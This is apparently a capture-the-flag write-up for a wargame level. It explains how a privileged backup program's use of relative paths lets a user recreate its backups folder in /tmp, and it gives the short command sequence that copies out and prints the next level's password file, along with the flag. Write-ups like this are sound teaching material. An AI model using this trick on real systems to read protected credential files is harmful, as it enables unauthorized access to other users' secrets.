# level08
## Program behaviour

1. Ask for `filename` as first argument
2. Try to open `./backups/.log` for logging operations
3. Try to open `filename`
4. Try to open/create `./backups/ + filename`
5. Copy the content of `filename` to `./backups/ + filename`

## Vulnerability

The program uses relative paths to open files in `backups` folder.
This is a bad idea since we can recreate the `./backups/` folder elsewhere (eg: `/tmp/backups`) and the program has no idea that this is not the original folder.
On top of that if we recreate the same directory structure in `/tmp/backups` as the one passed in `filename` we can read the content of any file that the program has the rights to.

## Exploitation

1. Create the necessary folders and change directory to `/tmp`
```sh
level08@OverRide:~$ mkdir -p /tmp/backups/home/users/level09
level08@OverRide:~$ cd /tmp
```

2. Run the program with `/home/users/level09/.pass` as `filename`
```sh
level08@OverRide:~$ ~/level08 /home/users/level09/.pass
level08@OverRide:~$ cat ./backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```